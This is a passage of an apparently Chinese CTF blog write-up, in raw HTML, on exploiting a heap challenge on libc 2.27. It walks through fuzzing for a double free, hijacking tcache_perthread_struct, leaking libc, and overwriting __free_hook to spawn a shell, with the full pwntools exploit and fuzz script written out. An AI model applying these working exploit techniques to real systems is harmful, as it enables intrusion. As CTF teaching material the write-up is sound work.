class="subst">&#123;line_count&#125;</span>hang&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;down&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            os.remove(<span class="string">&quot;./log.txt&quot;</span>) <span class="comment">#如果手法太复杂也要从头来  </span></span><br><span class="line">            r.close()</span><br></pre></td></tr></table></figure>
+
+<p>运行这个脚本,<del>不一会儿</del>我们就能找到符合条件的利用过程(换成小于40行了,我发现小于20行半天爆破不出来)</p>
+<p><img src="/images/fuzz/1751103602912.png" alt="1751103602912"></p>
+<p>总之我们此时获得了一个可以double free的手段</p>
+<h3 id="2-3-人脑代替电脑思考-堆利用"><a href="#2-3-人脑代替电脑思考-堆利用" class="headerlink" title="2.3 人脑代替电脑思考-堆利用"></a>2.3 人脑代替电脑思考-堆利用</h3><h4 id="double-free的劫持"><a href="#double-free的劫持" class="headerlink" title="double free的劫持"></a>double free的劫持</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">10</span>).encode())</span><br><span class="line">add(<span class="number">0</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">20</span>).encode())</span><br><span class="line">add(<span class="number">7</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">30</span>).encode())</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">40</span>).encode())</span><br><span class="line">add(<span class="number">1</span>,<span class="number">3</span>,<span class="built_in">str</span>(<span class="number">50</span>).encode())</span><br><span class="line">add(<span class="number">3</span>,<span class="number">4</span>,<span class="built_in">str</span>(<span class="number">60</span>).encode())</span><br><span class="line">add(<span class="number">6</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">70</span>).encode())</span><br><span class="line">add(<span class="number">4</span>,<span class="number">8</span>,<span class="built_in">str</span>(<span class="number">80</span>).encode())</span><br><span class="line">delet(<span class="number">0</span>,<span class="number">6</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">7</span>,<span class="built_in">str</span>(<span class="number">90</span>).encode())</span><br><span class="line">add(<span class="number">7</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">110</span>).encode())</span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">120</span>).encode())</span><br><span class="line">add(<span class="number">2</span>,<span class="number">3</span>,<span class="built_in">str</span>(<span class="number">140</span>).encode())</span><br><span class="line">delet(<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">delet(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">1</span>,<span class="number">3</span>)</span><br><span class="line"><span class="comment">#delet(1,3)</span></span><br></pre></td></tr></table></figure>
+
+<p>这个过程可以让我们得到一个可以编辑且已经被释放的堆块(1,3)</p>
+<p>此时我们可以泄露堆地址,然后任意地址写(既然只知道堆地址,也就是堆上任意地址写)</p>
+<p>我们劫持什么呢🤔,首先我们先梳理一下目前我们的状态</p>
+<ul>
+<li>我们有一次任意地址写0x20字符,且必须写满0x20</li>
+<li>基于fuzz的堆风水已经让堆很乱了,再次堆风水创造一个<code>double free</code>对我而言基本上不可能</li>
+</ul>
+<p>也就是我们这次劫持的地址必须能让我们拥有持续利用堆的能力</p>
+<h5 id="teache-struct"><a href="#teache-struct" class="headerlink" title="teache_struct"></a>teache_struct</h5><p><code>teachebins</code>从libc2.26引入,用于管理较小堆块,其中负责管理的数据结构称为<code>teache_struct</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> &#123;</span><span class="comment">//TCACHE_MAX_BINS=0x40</span></span><br><span class="line">  <span class="type">uint16_t</span>/<span class="type">uint8_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个结构体由一个int8&#x2F;int16数组和一个指针数组组成</p>
+<p>其中</p>
+<ul>
+<li>int8&#x2F;int16数组负责记录每种teachebins的数量</li>
+<li>指针数组负责记录表头的next指针</li>
+</ul>
+<p>回到堆利用,如果我们能劫持这个结构,就能实现任意地址写,而且本题的edit是不限次数的,也就是说我们想申请什么就申请什么</p>
+<p>此时我们使用gdb观察劫持前的bins情况</p>
+<p><img src="/images/fuzz/1751104492262.png" alt="1751104492262"></p>
+<p>这个是我们可以利用的<code>double free chunk</code></p>
+<p>由于每次申请的堆块太小了,我们想要劫持<code>teache_struct</code>需要分两次:<code>number数组</code>,<code>指针数组</code></p>
+<p>但是目前我们只能劫持一次,所以我们可以</p>
+<ul>
+<li>先劫持指针数组</li>
+<li>使用指针数组为我们分配一个<code>number数组</code></li>
+<li>再劫持<code>number数组</code>,此时相当于控制了<code>teache_struct</code></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">1</span>,<span class="number">3</span>,p64(heap+<span class="number">0x10</span>+<span class="number">0x48</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">2</span>)                    <span class="comment">#control_ptr(4,2)</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">2</span>,p64(heap+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">3</span>,p8(<span class="number">5</span>)*<span class="number">2</span>)            <span class="comment">#control_num(4,3)</span></span><br></pre></td></tr></table></figure>
+
+<p>保持(4,2)中不小于等于0,在(4,3)中写入想要劫持的地址</p>
+<h4 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h4><p>每次我们只能建立一个<code>0x30</code>的堆块,很明显放不进unsortbins🤔</p>
+<p>但是我们可以任意堆地址写,我们人为把堆的head中的size改一下不就行了嘛😋</p>
+<p>随便一找,找到几个总大小为0x220的堆块,且不直接接触<code>top_chunk</code></p>
+<p>修改后的堆如下</p>
+<p><img src="/images/fuzz/1751105035960.png" alt="1751105035960"></p>
+<p>顺便在(4,2)中把0x220的teachebins数量改为7,这样就会直接进入<code>unsortbins</code>中了</p>
+<p><img src="/images/fuzz/1751105068490.png" alt="1751105068490"></p>
+<p>成功让libc地址出现在heap中,最后让query在一个比较大的范围内打印,找找就能看到libc信息</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">head=heap+<span class="number">0x580</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">2</span>,p64(heap+<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">4</span>,p8(<span class="number">7</span>))</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">2</span>,p64(head-<span class="number">0x18</span>))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">2</span>,p64(head))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">5</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x221</span>))</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">2</span>,p64(head+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">1</span>)</span><br><span class="line">delet(<span class="number">5</span>,<span class="number">1</span>)</span><br><span class="line">query(<span class="number">0</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">6</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;12-th name: \x00\x00\x00\x00\x00\x00\x00\x00!\x02\x00\x00\x00\x00\x00\x00&quot;</span>)</span><br><span class="line">base=u64(r.recv(<span class="number">8</span>))-<span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;base=&gt;<span class="subst">&#123;<span class="built_in">hex</span>(base)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="最后一步-劫持-free-hook"><a href="#最后一步-劫持-free-hook" class="headerlink" title="最后一步,劫持__free_hook"></a>最后一步,劫持__free_hook</h3><p>做到这里基本上就相当于打完了.有了堆,libc地址,可以任意分配堆块–我们从一个小小的uaf里挖掘出这么多的资产</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fhook=base+libc.sym.__free_hook</span><br><span class="line">system=base+libc.sym.system</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">2</span>,p64(fhook-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">6</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>+p64(system))</span><br><span class="line">delet(<span class="number">5</span>,<span class="number">6</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>| 3 | EXP+fuzz</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cho</span>(<span class="params">num</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(num).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x,y,name=<span class="string">b&#x27;\x00&#x27;</span></span>):</span><br><span class="line">    cho(<span class="number">0</span>)</span><br><span class="line">    data=r.recv()</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;two many&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">raise</span> EOFerror</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(x).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;value: &quot;</span>,<span class="built_in">str</span>(y).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&quot;new element name: &quot;</span>,name.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delet</span>(<span class="params">x,y</span>):</span><br><span class="line">    cho(<span class="number">1</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;want element x-coordinate value: &quot;</span>,<span class="built_in">str</span>(x).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;want element y-coordinate value: &quot;</span>,<span class="built_in">str</span>(y).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">x,y,name</span>):</span><br><span class="line">    cho(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;want element x-coordinate value: &quot;</span>,<span class="built_in">str</span>(x).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;want element y-coordinate value: &quot;</span>,<span class="built_in">str</span>(y).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&quot;name: &quot;</span>,name.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">x,y</span>):</span><br><span class="line">    cho(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;value&#x27;</span>,<span class="built_in">str</span>(x).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;value&#x27;</span>,<span class="built_in">str</span>(y).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">a,b,c,d</span>):</span><br><span class="line">    cho(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;value: &quot;</span>,<span class="built_in">str</span>(a).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;value: &quot;</span>,<span class="built_in">str</span>(b).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;value: &quot;</span>,<span class="built_in">str</span>(c).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;value: &quot;</span>,<span class="built_in">str</span>(d).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line">r=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#r=remote(&quot;node5.anna.nssctf.cn&quot;,23868)</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">10</span>).encode())</span><br><span class="line">add(<span class="number">0</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">20</span>).encode())</span><br><span class="line">add(<span class="number">7</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">30</span>).encode())</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">40</span>).encode())</span><br><span class="line">add(<span class="number">1</span>,<span class="number">3</span>,<span class="built_in">str</span>(<span class="number">50</span>).encode())</span><br><span class="line">add(<span class="number">3</span>,<span class="number">4</span>,<span class="built_in">str</span>(<span class="number">60</span>).encode())</span><br><span class="line">add(<span class="number">6</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">70</span>).encode())</span><br><span class="line">add(<span class="number">4</span>,<span class="number">8</span>,<span class="built_in">str</span>(<span class="number">80</span>).encode())</span><br><span class="line">delet(<span class="number">0</span>,<span class="number">6</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">7</span>,<span class="built_in">str</span>(<span class="number">90</span>).encode())</span><br><span class="line">add(<span class="number">7</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">110</span>).encode())</span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="string">b&quot;aaa&quot;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">delet(<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">delet(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">1</span>,<span class="number">3</span>)</span><br><span class="line"><span class="comment">#delet(1,3)</span></span><br><span class="line"></span><br><span class="line">query(<span class="number">1</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;2-th name: &quot;</span>)</span><br><span class="line">heap=u64(r.recv(<span class="number">8</span>))-<span class="number">0x5c0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;heap=&gt;<span class="subst">&#123;<span class="built_in">hex</span>(heap)&#125;</span>&quot;</span>)</span><br><span class="line">head=heap+<span class="number">0x580</span></span><br><span class="line"><span class="comment">#===============================================================</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">3</span>,p64(heap+<span class="number">0x10</span>+<span class="number">0x48</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">2</span>)                    <span class="comment">#control_ptr(4,2)</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">2</span>,p64(heap+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">3</span>,p8(<span class="number">5</span>)*<span class="number">2</span>)            <span class="comment">#control_num(4,3)</span></span><br><span class="line">head=heap+<span class="number">0x580</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">2</span>,p64(heap+<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">4</span>,p8(<span class="number">7</span>))</span><br><span class="line"><span class="comment">#===============================================================</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">2</span>,p64(head-<span class="number">0x18</span>))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">2</span>,p64(head))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">5</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x221</span>))</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">2</span>,p64(head+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">1</span>)</span><br><span class="line">delet(<span class="number">5</span>,<span class="number">1</span>)</span><br><span class="line">bug()</span><br><span class="line">query(<span class="number">0</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">6</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;12-th name: \x00\x00\x00\x00\x00\x00\x00\x00!\x02\x00\x00\x00\x00\x00\x00&quot;</span>)</span><br><span class="line">base=u64(r.recv(<span class="number">8</span>))-<span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;base=&gt;<span class="subst">&#123;<span class="built_in">hex</span>(base)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment">#===============================================================</span></span><br><span class="line">fhook=base+libc.sym.__free_hook</span><br><span class="line">system=base+libc.sym.system</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">2</span>,p64(fhook-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">6</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>+p64(system))</span><br><span class="line"></span><br><span class="line">delet(<span class="number">5</span>,<span class="number">6</span>)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TooManyElementsError</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cho</span>(<span class="params">num</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(num).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x,y,name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;add(<span class="subst">&#123;x&#125;</span>,<span class="subst">&#123;y&#125;</span>)&quot;</span>)</span><br><span class="line">    cho(<span class="number">0</span>)</span><br><span class="line">    data=r.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;two many&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        <span class="keyword">raise</span> TooManyElementsError</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(x).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;value: &quot;</span>,<span class="built_in">str</span>(y).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&quot;new element name: &quot;</span>,name.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delet</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;free(<span class="subst">&#123;x&#125;</span>,<span class="subst">&#123;y&#125;</span>)&quot;</span>)</span><br><span class="line">    cho(<span class="number">1</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;want element x-coordinate value: &quot;</span>,<span class="built_in">str</span>(x).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;want element y-coordinate value: &quot;</span>,<span class="built_in">str</span>(y).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">x,y,name</span>):</span><br><span class="line">    cho(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;want element x-coordinate value: &quot;</span>,<span class="built_in">str</span>(x).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;want element y-coordinate value: &quot;</span>,<span class="built_in">str</span>(y).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&quot;name: &quot;</span>,name.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">x,y</span>):</span><br><span class="line">    cho(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;value&#x27;</span>,<span class="built_in">str</span>(x).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;value&#x27;</span>,<span class="built_in">str</span>(y).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">a,b,c,d</span>):</span><br><span class="line">    cho(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;value: &quot;</span>,<span class="built_in">str</span>(a).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;value: &quot;</span>,<span class="built_in">str</span>(b).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;value: &quot;</span>,<span class="built_in">str</span>(c).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;value: &quot;</span>,<span class="built_in">str</span>(d).encode())</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fuzz</span>():</span><br><span class="line">    <span class="keyword">global</span> f</span><br><span class="line">    f=<span class="built_in">open</span>(<span class="string">&#x27;./log.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000</span>):</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">10</span>==<span class="number">0</span>):</span><br><span class="line">            a = randint(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">            b = randint(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">            add(a,b,<span class="built_in">str</span>(i).encode())</span><br><span class="line">            data0=r.recvuntil(<span class="string">b&#x27;Choice Table&#x27;</span>)</span><br><span class="line">            f.write(<span class="string">&#x27;add(&#123;&#125;,&#123;&#125;,str(&#123;&#125;).encode())\n&#x27;</span>.<span class="built_in">format</span>(a,b,i))</span><br><span class="line">        <span class="keyword">elif</span>(i%<span class="number">2</span>==<span class="number">0</span>):</span><br><span class="line">            a = randint(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">            b = randint(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">            delet(a,b)</span><br><span class="line">            data0=r.recvline()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;not exists&#x27;</span> <span class="keyword">in</span> data0:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            f.write(<span class="string">&#x27;delet(&#123;&#125;,&#123;&#125;)\n&#x27;</span>.<span class="built_in">format</span>(a,b))</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">global</span> f</span><br><span class="line">    r=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fuzz()</span><br><span class="line">    <span class="keyword">except</span> TooManyElementsError:</span><br><span class="line">        f.close()</span><br><span class="line">        os.remove(<span class="string">&quot;./log.txt&quot;</span>)</span><br><span class="line">        r.close()</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        f.close()</span><br><span class="line">        line_count = <span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;log.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> line_count&lt;<span class="number">40</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;line_count&#125;</span>hang&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;down&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            os.remove(<span class="string">&quot;./log.txt&quot;</span>)</span><br><span class="line">            r.close()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
